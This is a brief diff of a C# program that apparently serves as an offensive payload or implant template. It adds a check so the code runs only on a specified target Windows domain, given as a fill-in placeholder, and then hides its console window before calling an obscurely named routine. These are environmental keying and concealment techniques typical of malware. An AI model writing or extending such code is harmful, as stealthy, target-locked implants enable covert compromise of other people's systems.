@@ -33,6 +33,11 @@ public class Program
 
 	public static void Sharp()
 	{
+		if(!string.IsNullOrEmpty("#REPLACEMEDOMAIN#") && !Environment.UserDomainName.Contains("#REPLACEMEDOMAIN#"))
+		{
+			return;
+		}
+
 		var handle = GetConsoleWindow();
 		ShowWindow(handle, SW_HIDE);
 		AUnTrCrts();
